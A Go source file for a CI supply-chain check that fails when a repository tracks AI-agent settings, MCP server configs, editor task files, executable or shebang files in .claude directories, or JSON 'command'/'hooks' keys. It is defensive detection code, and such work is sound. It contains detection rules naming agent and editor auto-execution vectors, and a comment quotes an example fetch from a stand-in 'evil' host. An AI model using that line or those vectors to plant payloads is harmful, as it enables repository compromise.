// Copyright 2026 Microsoft Corporation
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// verify-supply-chain inspects the files tracked by git and fails if any of
// them match a high-confidence supply-chain attack indicator: an AI-agent
// settings file, MCP server configuration, an editor configuration file, or a
// payload dropped into an agent configuration directory.
//
// Only tracked files are inspected. Developers routinely keep gitignored
// agent configuration (for example .claude/settings.local.json) in their
// working copy, and that is not what this check is about.
//
// Exit code is 1 if any violations are found, 2 on an internal error.
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"maps"
	"os"
	"os/exec"
	"path"
	"slices"
	"strings"
)

// agentConfigDir and editorConfigDir are matched as whole path segments at any
// depth. The repository's .gitignore only anchors these at the root, so
// frontend/.claude/settings.json would otherwise go unnoticed.
const (
	agentConfigDir  = ".claude"
	editorConfigDir = ".vscode"
)

// agentSettingsFiles are agent configuration files that grant an agent
// standing permission to execute things. They must never be committed.
var agentSettingsFiles = map[string]bool{
	"settings.json":       true,
	"settings.local.json": true,
	"mcp.json":            true,
}

// editorConfigFiles are editor files that can execute commands on folder open
// or recommend extensions. Nothing under .vscode/ is legitimately tracked in
// this repository, so any of them appearing in a PR is a red flag.
var editorConfigFiles = map[string]bool{
	"settings.json":   true,
	"extensions.json": true,
	"tasks.json":      true,
	"launch.json":     true,
}

// mcpConfigFiles name an MCP server set, every entry of which carries a
// command that the agent launches. These are matched by basename at any path,
// not under an agent directory: the project-scoped form sits at the repository
// root with no .claude segment to key off, and it is not gitignored. This
// repository already treats it as auto-discovered agent configuration — see
// the EnableConfigDiscovery comment in tooling/hcpctl/pkg/agent/agent.go.
// Matching by basename also covers .cursor/mcp.json and .vscode/mcp.json.
var mcpConfigFiles = map[string]bool{
	"mcp.json":  true,
	".mcp.json": true,
}

// inertAgentExtensions are the only file types that may live in an agent
// configuration directory: documentation and data, nothing a shell,
// interpreter or desktop environment will run.
//
// This is an allowlist because the denylist it replaced could not be
// completed. Enumerating executable types missed .cmd and .bat, and would
// have gone on missing .command (double-clickable on macOS), .scpt, .jse, and
// files with no extension at all — each a payload that runs just as well from
// a path the agent is pointed at. Inverting the test removes the whole class
// of bypass instead of the instances found so far.
//
// Extending this list is deliberately a code change, reviewed like any other.
var inertAgentExtensions = map[string]bool{
	".md":   true,
	".json": true,
	".txt":  true,
	".yaml": true,
	".yml":  true,
}

// executionKeys are JSON keys that make an agent configuration file
// self-executing. A .claude settings file carrying one of these matches a
// confirmed real-world malware pattern. The order is fixed so that a file
// carrying several of them always reports the same one.
var executionKeys = []string{"command", "hooks"}

func isExecutionKey(key string) bool {
	return slices.Contains(executionKeys, key)
}

const (
	ruleAgentSettings = "agent-settings"
	ruleEditorConfig  = "editor-config"
	ruleAgentPayload  = "agent-payload"
	ruleExecutionKey  = "execution-key"
)

// finding is a single violation. malware marks the indicators that match a
// known attack pattern rather than merely being unwanted.
type finding struct {
	path    string
	rule    string
	detail  string
	malware bool
}

func main() {
	root := "."
	if len(os.Args) > 1 {
		root = os.Args[1]
	}

	files, err := trackedFiles(root)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error listing tracked files in %s: %v\n", root, err)
		os.Exit(2)
	}

	findings := checkPaths(files)

	// A path already reported as a payload needs no second payload finding.
	// The JSON scan below is exempt: it escalates a file that checkPaths has
	// merely rejected into one that matches a known attack pattern.
	flagged := make(map[string]bool, len(findings))
	for _, f := range findings {
		flagged[f.path] = true
	}

	for _, rel := range agentDirFiles(files) {
		if flagged[rel] {
			continue
		}
		content, err := os.ReadFile(path.Join(root, rel))
		if err != nil {
			fmt.Fprintf(os.Stderr, "error reading %s: %v\n", rel, err)
			os.Exit(2)
		}
		findings = append(findings, scanAgentShebang(rel, content)...)
	}

	for _, rel := range agentJSONFiles(files) {
		content, err := os.ReadFile(path.Join(root, rel))
		if err != nil {
			fmt.Fprintf(os.Stderr, "error reading %s: %v\n", rel, err)
			os.Exit(2)
		}
		findings = append(findings, scanAgentJSON(rel, content)...)
	}

	if len(findings) == 0 {
		return
	}

	report(os.Stderr, findings)
	os.Exit(1)
}

// Index modes git records for a tracked entry. Anything other than a plain
// non-executable file is worth knowing about inside an agent directory: the
// executable bit makes a payload runnable whatever its name ends in, and a
// symlink or submodule resolves to content that is not reviewed in this diff.
const (
	modeRegular    = "100644"
	modeExecutable = "100755"
	modeSymlink    = "120000"
	modeSubmodule  = "160000"
)

// trackedFile is one entry of the git index: the path, plus the mode git
// stores alongside it.
type trackedFile struct {
	path string
	mode string
}

// trackedFiles returns every file tracked by git, which excludes both
// untracked and gitignored files, with the mode recorded in the index.
func trackedFiles(root string) ([]trackedFile, error) {
	// --stage prints "<mode> <sha> <stage>\t<path>", so the executable bit is
	// read from the index rather than the working tree. That keeps the check
	// honest on a fresh clone and on filesystems that do not carry the bit.
	cmd := exec.Command("git", "ls-files", "--stage", "-z")
	cmd.Dir = root
	cmd.Stderr = os.Stderr
	out, err := cmd.Output()
	if err != nil {
		return nil, err
	}

	var files []trackedFile
	for _, entry := range bytes.Split(out, []byte{0}) {
		if len(entry) == 0 {
			continue
		}
		meta, p, ok := bytes.Cut(entry, []byte{'\t'})
		if !ok {
			return nil, fmt.Errorf("unexpected git ls-files entry %q", entry)
		}
		mode, _, ok := bytes.Cut(meta, []byte{' '})
		if !ok {
			return nil, fmt.Errorf("unexpected git ls-files metadata %q", meta)
		}
		files = append(files, trackedFile{path: string(p), mode: string(mode)})
	}
	return files, nil
}

// checkPaths applies the path-shaped rules. It is pure so that the denylist
// can be exercised without a git repository on disk.
//
// Every comparison is made against the lowercased path. Git's index is
// case-sensitive, so ".claude/Setup.SH" and ".Claude/settings.json" are
// distinct tracked paths that would otherwise sidestep the denylist while
// remaining just as executable.
func checkPaths(files []trackedFile) []finding {
	var findings []finding
	for _, f := range files {
		lower := strings.ToLower(f.path)
		base := path.Base(lower)
		switch {
		case mcpConfigFiles[base]:
			findings = append(findings, finding{
				path:   f.path,
				rule:   ruleAgentSettings,
				detail: "MCP server configuration must not be committed",
			})
		case hasSegment(lower, agentConfigDir) && agentSettingsFiles[base]:
			findings = append(findings, finding{
				path:   f.path,
				rule:   ruleAgentSettings,
				detail: "AI-agent settings files must not be committed",
			})
		case hasSegment(lower, editorConfigDir) && editorConfigFiles[base]:
			findings = append(findings, finding{
				path:   f.path,
				rule:   ruleEditorConfig,
				detail: "editor configuration files must not be committed",
			})
		case hasSegment(lower, agentConfigDir) && !inertAgentExtensions[path.Ext(base)]:
			findings = append(findings, finding{
				path:   f.path,
				rule:   ruleAgentPayload,
				detail: "only documentation and data files may live in an agent configuration directory",
			})
		// Checked after the suffix rule so that a plainly named script still
		// reports the clearer message. A suffix is only a claim about content;
		// this catches the file that dresses as documentation and keeps the
		// executable bit, which is what actually makes it runnable.
		case hasSegment(lower, agentConfigDir) && f.mode != modeRegular:
			findings = append(findings, finding{
				path:   f.path,
				rule:   ruleAgentPayload,
				detail: modeDetail(f.mode),
			})
		}
	}
	return findings
}

func modeDetail(mode string) string {
	switch mode {
	case modeExecutable:
		return "files in an agent configuration directory must not be executable"
	case modeSymlink:
		return "symlinks must not live in an agent configuration directory"
	case modeSubmodule:
		return "submodules must not live in an agent configuration directory"
	default:
		return fmt.Sprintf("unexpected git mode %s in an agent configuration directory", mode)
	}
}

// agentJSONFiles returns the tracked JSON whose contents need inspecting for
// execution keys: anything under an agent configuration directory, plus MCP
// server configuration wherever it sits.
func agentJSONFiles(files []trackedFile) []string {
	var out []string
	for _, f := range files {
		lower := strings.ToLower(f.path)
		switch {
		case mcpConfigFiles[path.Base(lower)]:
			out = append(out, f.path)
		case hasSegment(lower, agentConfigDir) && path.Ext(lower) == ".json":
			out = append(out, f.path)
		}
	}
	return out
}

// agentDirFiles returns the tracked files inside an agent configuration
// directory, whose first bytes need checking for a shebang.
func agentDirFiles(files []trackedFile) []string {
	var out []string
	for _, f := range files {
		if hasSegment(strings.ToLower(f.path), agentConfigDir) {
			out = append(out, f.path)
		}
	}
	return out
}

// scanAgentShebang reports a file in an agent configuration directory that
// opens with a shebang.
//
// This is the companion to the mode rule: dropping the executable bit is
// enough to get a script past it, but `bash .claude/setup.md` runs the file
// either way, so the interpreter line is the part worth recognising.
//
// Deliberately only the first two bytes. Looking for shell syntax anywhere in
// the file would flag every SKILL.md in this repository, since agent
// documentation is mostly fenced command examples — the thing being detected
// and the thing being documented are written identically. A leading shebang
// is not ambiguous in that way.
func scanAgentShebang(p string, content []byte) []finding {
	if !bytes.HasPrefix(content, []byte("#!")) {
		return nil
	}
	return []finding{{
		path:   p,
		rule:   ruleAgentPayload,
		detail: "file in an agent configuration directory begins with a shebang",
	}}
}

// scanAgentJSON reports execution keys anywhere in an agent JSON file. A file
// that does not parse is scanned as raw text instead, so that deliberately
// malformed JSON cannot slip past the decoder. Both paths only match keys, so
// the two agree on content like `{"type": "command"}` — the ordinary shape of
// a hook definition — regardless of whether it happens to parse.
func scanAgentJSON(p string, content []byte) []finding {
	var doc any
	if err := json.Unmarshal(content, &doc); err != nil {
		if key, ok := findExecutionKeyInText(content); ok {
			return []finding{{
				path:    p,
				rule:    ruleExecutionKey,
				detail:  fmt.Sprintf("malformed JSON containing a %q key", key),
				malware: true,
			}}
		}
		return nil
	}

	if key, ok := findExecutionKey(doc); ok {
		return []finding{{
			path:    p,
			rule:    ruleExecutionKey,
			detail:  fmt.Sprintf("contains a %q key", key),
			malware: true,
		}}
	}
	return nil
}

// findExecutionKey walks a decoded JSON document for the first execution key.
func findExecutionKey(node any) (string, bool) {
	switch v := node.(type) {
	case map[string]any:
		for _, key := range slices.Sorted(maps.Keys(v)) {
			if isExecutionKey(key) {
				return key, true
			}
			if found, ok := findExecutionKey(v[key]); ok {
				return found, true
			}
		}
	case []any:
		for _, child := range v {
			if found, ok := findExecutionKey(child); ok {
				return found, true
			}
		}
	}
	return "", false
}

// findExecutionKeyInText reports the first execution key that appears in key
// position, treating content as JSON-with-comments.
//
// This lexes rather than pattern-matching the raw bytes, because the two
// things it has to tell apart cannot be recognised in isolation. A quoted
// token only means anything when it is a key: `{"type": "command"}` is the
// ordinary shape of a hook definition. And "//" only opens a comment outside
// a string: stripping comments first would cut `"curl https://evil/x.sh"`
// short and silently drop a real execution key later on the same line — a
// false negative in a security gate, which is worse than the false positive
// it set out to fix.
//
// It is a best-effort net over content a JSON parser already rejected, not a
// full parser: scanning stops at an unterminated string, since nothing after
// it can be located reliably. That bias is deliberate. A miss here only costs
// the malware escalation — agent settings files are blocked outright by
// checkPaths whatever they contain — whereas a false hit tells an author their
// file is confirmed malware and sends them to the security team.
func findExecutionKeyInText(content []byte) (string, bool) {
	for i := 0; i < len(content); {
		switch {
		case isCommentStart(content, i):
			i = skipComment(content, i)
		case content[i] == '"':
			token, next, ok := lexString(content, i)
			if !ok {
				return "", false
			}
			i = next
			if j := skipSpaceAndComments(content, i); j < len(content) && content[j] == ':' && isExecutionKey(token) {
				return token, true
			}
		default:
			i++
		}
	}
	return "", false
}

func isCommentStart(b []byte, i int) bool {
	return b[i] == '/' && i+1 < len(b) && (b[i+1] == '/' || b[i+1] == '*')
}

// skipComment returns the index just past the comment starting at i. An
// unterminated block comment swallows the rest of the input, as it would for
// any consumer that accepts comments at all.
func skipComment(b []byte, i int) int {
	if b[i+1] == '/' {
		for i < len(b) && b[i] != '\n' {
			i++
		}
		return i
	}
	for i += 2; i+1 < len(b); i++ {
		if b[i] == '*' && b[i+1] == '/' {
			return i + 2
		}
	}
	return len(b)
}

// skipSpaceAndComments returns the index of the next byte that is neither
// whitespace nor part of a comment, so that a key is still recognised when a
// comment sits between it and its colon.
func skipSpaceAndComments(b []byte, i int) int {
	for i < len(b) {
		switch {
		case b[i] == ' ' || b[i] == '\t' || b[i] == '\n' || b[i] == '\r':
			i++
		case isCommentStart(b, i):
			i = skipComment(b, i)
		default:
			return i
		}
	}
	return i
}

// lexString returns the string beginning at the quote at i and the index just
// past its closing quote. The token is unescaped with the JSON grammar where
// possible, so that an escaped spelling such as "command" is compared as
// the key a consumer would see.
func lexString(b []byte, i int) (string, int, bool) {
	for j := i + 1; j < len(b); j++ {
		switch b[j] {
		case '\\':
			j++ // the escaped byte cannot close the string
		case '"':
			raw := b[i : j+1]
			var s string
			if err := json.Unmarshal(raw, &s); err != nil {
				s = string(raw[1 : len(raw)-1])
			}
			return s, j + 1, true
		}
	}
	return "", len(b), false
}

// hasSegment reports whether segment appears as a whole path element, so that
// ".claude" matches "frontend/.claude/x" but not "notclaude/x". Callers pass a
// lowercased path; every denylist entry in this file is lowercase.
func hasSegment(p, segment string) bool {
	for _, part := range strings.Split(p, "/") {
		if part == segment {
			return true
		}
	}
	return false
}

func report(w io.Writer, findings []finding) {
	fmt.Fprintln(w, "ERROR: supply-chain attack indicators found in tracked files.")
	fmt.Fprintln(w)

	malware := false
	for _, f := range findings {
		fmt.Fprintf(w, "  %s (%s): %s\n", f.path, f.rule, f.detail)
		if f.malware {
			malware = true
			fmt.Fprintln(w, `      This matches a known supply-chain attack pattern. Do not run it.`)
			fmt.Fprintln(w, "      Report it to the security team before taking any other action.")
		}
	}

	fmt.Fprintln(w)
	if malware {
		fmt.Fprintln(w, "Do not interact with the files flagged as attack patterns above.")
	}
	fmt.Fprintln(w, `If these files are yours, remove them from the commit — they belong in`)
	fmt.Fprintln(w, `your local working copy only. See the "Security self-check" bullet in`)
	fmt.Fprintln(w, "CONTRIBUTING.md.")
}
